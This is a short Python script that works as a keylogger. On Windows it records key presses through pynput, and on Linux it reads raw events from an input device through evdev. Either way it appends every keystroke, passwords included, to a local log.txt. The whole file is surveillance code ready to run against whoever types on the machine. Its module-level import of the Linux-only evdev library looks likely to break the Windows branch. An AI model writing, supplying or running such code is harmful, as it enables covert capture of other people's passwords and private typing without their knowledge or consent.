import platform
import struct
import time
import os
from evdev import InputDevice, categorize, ecodes

def main():
    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Check the operating system
    is_windows = platform.system() == "Windows"

    if is_windows:
        from pynput import keyboard

        output_file = os.path.join(script_dir, "log.txt")
        os.makedirs(os.path.dirname(output_file), exist_ok=True)

        def on_press(key):
            try:
                with open(output_file, "a") as log:
                    if key == keyboard.Key.space:
                        log.write("SPACE ")
                    elif key == keyboard.Key.backspace:
                        log.write("BACKSPACE ")
                    elif key == keyboard.Key.enter:
                        log.write("ENTER ")
                    else:
                        log.write(f"{key.char} ")
            except AttributeError:
                pass

        # Start listening to keyboard events
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    else:
        # Path to the input device (you may need to change this to the correct event number)
        input_device = "/dev/input/event0"
        output_file = os.path.join(script_dir, "log.txt")

        # Open the input device
        device = InputDevice(input_device)

        # Open the log file
        with open(output_file, "a") as log:
            for event in device.read_loop():
                if event.type == ecodes.EV_KEY:  # Check if the event is a key event
                    key_event = categorize(event)
                    if key_event.keystate == key_event.key_down:  # Key press event
                        key_name = key_event.keycode
                        if key_name.startswith("KEY_"):
                            key_name = key_name.replace("KEY_", "")
                        log.write(f"{key_name} ")
                    log.flush()  # Ensure the data is written to the file immediately

# Ensure the script runs only when executed directly
if __name__ == "__main__":
    main()